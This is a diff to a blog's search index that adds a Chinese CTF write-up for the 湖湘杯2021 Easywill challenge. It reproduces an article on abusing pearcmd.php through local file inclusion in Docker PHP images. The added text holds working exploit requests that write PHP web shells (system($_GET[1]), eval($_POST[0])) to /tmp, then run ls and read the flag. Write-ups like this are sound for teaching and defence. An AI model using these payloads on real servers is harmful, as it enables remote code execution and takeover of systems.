@@ -21280,11 +21280,101 @@ print s.get(url=url_flag).content
       </tags>
   </entry>
   <entry>
-    <title>湖湘杯2021</title>
+    <title>pearcmd.php小trick/湖湘杯2021</title>
     <url>/2021/11/15/hu-xiang-bei-2021/</url>
-    <content><![CDATA[<h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码丢，进seay审计代码：</p>
+    <content><![CDATA[<h1 id="pearcmd-php小trick"><a href="#pearcmd-php小trick" class="headerlink" title="pearcmd.php小trick"></a>pearcmd.php小trick</h1><p>湖湘杯easywill的基础</p>
+<p>原文：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>
+<p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
+<p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER['argv']</code>几个变量。</p>
+<p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p>
+<p>我们在PHP源码中可以看到这样的逻辑：</p>
+<pre><code>static zend_bool php_auto_globals_create_server(zend_string *name)
+{
+    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),'S') || strchr(PG(variables_order),'s'))) {
+        php_register_server_variables();
+
+        if (PG(register_argc_argv)) {
+            if (SG(request_info).argc) {
+                zval *argc, *argv;
+
+                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;
+                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) {
+                    Z_ADDREF_P(argv);
+                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
+                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
+                }
+            } else {
+                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);
+            }
+        }
+
+    } else {
+        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
+        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
+    }
+    ...</code></pre>
+<p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p>
+<pre><code>php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);</code></pre>
+<p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p>
+<p>果然：</p>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
+<p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p>
+<blockquote>
+<p>4.4.  The Script Command Line</p>
+<p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p>
+<pre><code>  search-string = search-word *( "+" search-word )
+  search-word   = 1*schar
+  schar         = unreserved | escaped | xreserved
+  xreserved     = ";" | "/" | "?" | ":" | "@" | "&amp;" | "=" | "," |
+                  "$"</code></pre>
+<p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p>
+</blockquote>
+<p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p>
+<p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER['argv']</code>。</p>
+<p>我们再来看到pear中获取命令行argv的函数：</p>
+<pre><code>public static function readPHPArgv()
+{
+    global $argv;
+    if (!is_array($argv)) {
+        if (!@is_array($_SERVER['argv'])) {
+            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
+                $msg = "Could not read cmd args (register_argc_argv=Off?)";
+                return PEAR::raiseError("Console_Getopt: " . $msg);
+            }
+            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
+        }
+        return $_SERVER['argv'];
+    }
+    return $argv;
+}</code></pre>
+<p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER['argv']</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p>
+<p>看看pear中有哪些可以利用的参数：</p>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></p>
+<p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<p>所以，我构造出最后的利用数据包如下：</p>
+<pre><code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
+Host: 192.168.1.162:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close</code></pre>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/8f2dd9ad-a7bd-456d-9c8e-f4a9cd7770cd.png" alt="image-20211101080626844.png"></p>
+<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/3b439ba8-a064-4348-a23d-6f96d6d5bb77.png" alt="image-20211101080156805.png"></p>
+<p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p>
+<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/e12aef87-9aea-41bb-a13f-6e0932e6b9cc.png" alt="image-20211101080447027.png"></p>
+<p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
+<h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码,丢进seay审计代码：</p>
 <p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118110602137.png" alt="image-20211118110602137"></p>
 <p>审计到Template.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    \<span class="token package">wiphp<span class="token punctuation">\</span>View</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>assign模板渲染</p>
 <pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
@@ -21301,11 +21391,18 @@ print s.get(url=url_flag).content
 <span class="token punctuation">}</span></code></pre>
 <p>$cfile可控</p>
 <pre><code>?name=cfile&amp;value=/etc/passwd</code></pre>
-<pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/.1.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ </code></pre>
-<pre><code>GET:
-?name=cfile&amp;value=/tmp/.1.php
-POST:
-0=system('cat /f*')</code></pre>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164144041.png" alt="image-20211118164144041"></p>
+<pre><code>?name=cfile&amp;+config-create+/&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=var_dump(system($_GET[1]));?&gt;+/tmp/a.php</code></pre>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164224693.png" alt="image-20211118164224693"></p>
+<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls</code></pre>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164039627.png" alt="image-20211118164039627"></p>
+<p>乱七八糟，查看根目录</p>
+<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls%20/</code></pre>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164013390.png" alt="image-20211118164013390"></p>
+<p>查看扥目录下的flag32897328937298hdwidh</p>
+<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=cat%20/flag32897328937298hdwidh</code></pre>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118163936469.png" alt="image-20211118163936469"></p>
+<pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/b.php+-d+man_dir=&lt;?@eval($_POST[0]);?&gt;+-s+ </code></pre>
 <h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>pom.xml里面有个shiro 1.5.0</p>
 ]]></content>
   </entry>
